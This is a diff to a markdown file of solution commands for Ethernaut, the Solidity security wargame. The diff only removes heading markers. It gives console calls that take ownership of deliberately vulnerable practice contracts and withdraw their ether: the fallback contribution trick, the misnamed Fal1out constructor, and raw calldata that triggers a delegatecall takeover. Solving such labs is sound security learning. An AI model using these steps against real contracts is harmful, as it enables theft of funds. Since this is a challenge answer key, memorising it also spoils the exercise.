@@ -1,4 +1,4 @@
-#1. Hello Ethernaut
+1. Hello Ethernaut
 ```
 contract.info()
 
@@ -20,7 +20,7 @@ contract.authenticate("ethernaut0")
 
 ```
 ---
-#2. Fallback
+2. Fallback
 ```
 contract.contribute.sendTransaction({from: player, value: toWei("0.0001")})
 
@@ -29,20 +29,20 @@ contract.sendTransaction({from: player, value: toWei(0.0000001)})
 contract.withdraw()
 ```
 ---
-#3. Fallout
+3. Fallout
 ```
 contract.Fal1out.sendTransaction({from: player, value: toWei("0.00001")})
 ```
-#4. Coin Flip
+4. Coin Flip
 
 ---
-#5. Telephone
+5. Telephone
 
 ---
-#6. Token
+6. Token
 
 ---
-#7. Delegation
+7. Delegation
 ```
 contract.sendTransaction({from: player, to: this, value:0, data: "0xdd365b8b" })
 ```
